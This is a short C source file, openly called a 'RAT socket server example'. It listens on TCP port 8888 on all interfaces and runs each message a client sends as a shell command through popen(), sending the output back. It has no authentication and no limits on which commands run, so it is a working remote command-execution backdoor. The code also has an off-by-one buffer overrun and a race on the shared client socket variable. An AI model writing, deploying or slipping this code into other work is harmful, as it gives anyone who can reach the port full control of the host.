/*
        C RAT socket server example
*/

#include <stdio.h>
#include <string.h> //strlen
#include <sys/socket.h>
#include <arpa/inet.h> //inet_addr
#include <unistd.h>    //write, close
#include <pthread.h>

#define EXCEEDED_MESSAGE "Client connections exceeded"
#define MAX_CONNECTIONS  5

// Function prototypes
void * client_function(void * client_sock);

int main(int argc, char * argv[])
{
    int                socket_desc, client_sock, c, rc, count = 0;
    struct sockaddr_in server, client;
    pthread_t          client_thread[5] = { 0 };

    // Create TCP socket, AF - address family, SOCK_STREAM - TCP
    socket_desc = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_desc == -1)
    {
        printf("Could not create socket");
    }
    puts("Socket created");

    // When a server closes a port it will go into a TIME_WAIT status
    // and subsequent attempts to use that port will fail with IN_USE
    // This will allow the server to immediately use a port even in
    // The TIME_WAIT status
    if (setsockopt(socket_desc, SOL_SOCKET, SO_REUSEADDR, &(int) { 1 }, sizeof(int)) < 0)
    {
        perror("setsockopt(SO_REUSEADDR) failed");
        return 1;
    }

    // Prepare the sockaddr_in structure
    server.sin_family      = AF_INET;     // ipv4 address family, AF_INET6 for ipv6
    server.sin_addr.s_addr = INADDR_ANY;  // Use any address/interface
    server.sin_port        = htons(8888); // Should be defined above

    // Bind - tell the system we want to use this ip/port - will fail if in use
    // or you don't have permissions
    if (bind(socket_desc, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        // print the error message
        perror("bind failed. Error");
        return 1;
    }
    puts("bind done");

    // Listen - Put the address/interface/port in the listening state
    listen(socket_desc, 3);

    // Accept and incoming connection
    puts("Waiting for incoming connections...");
    c = sizeof(struct sockaddr_in);

    for (;;)
    {

        // accept connection from an incoming client
        // Blocking call, will wait until a client connects
        client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t *)&c);
        if (client_sock < 0)
        {
            perror("accept failed");
            return 1;
        }
        printf("Connection accepted from %s port %d.\n",
               inet_ntoa(client.sin_addr),
               ntohs(client.sin_port));

        // Thread the client up to five connections
        if (count < MAX_CONNECTIONS)
        {
            rc = pthread_create(&client_thread[count],
                                NULL,
                                (void *)client_function,
                                (void *)&client_sock);

            // Check rc for status - later

            count++;
        }
        else
        {
            puts(EXCEEDED_MESSAGE);
            send(client_sock, EXCEEDED_MESSAGE, strlen(EXCEEDED_MESSAGE), 0);
            close(client_sock);
        }
    }

    for (count = 0; count < MAX_CONNECTIONS; count++)
    {
        if (client_thread[count] != 0)
        {
            pthread_join(client_thread[count], NULL);
        }
    }

    close(socket_desc);
    return 0;
}

void * client_function(void * args)
{
    int read_size;

    int client_sock = *(int *)args;

    char client_message[2000];

    FILE * fp;

    // Receive a message from client
    while ((read_size = recv(client_sock, client_message, 2000, 0)) > 0)
    {
        client_message[read_size] = 0;
        fp                        = popen(client_message, "r");

        if (NULL == fp)
        {
            continue;
        }

        // Send the message back to client
        while (read_size = fread(client_message, 1, 2000, fp))
        {
            send(client_sock, client_message, read_size, 0);
            // fsync(client_sock);
        }

        pclose(fp);
    }

    close(client_sock);

    if (read_size == 0)
    {
        puts("Client disconnected");
        fflush(stdout);
    }
    else if (read_size == -1)
    {
        perror("recv failed");
    }
}
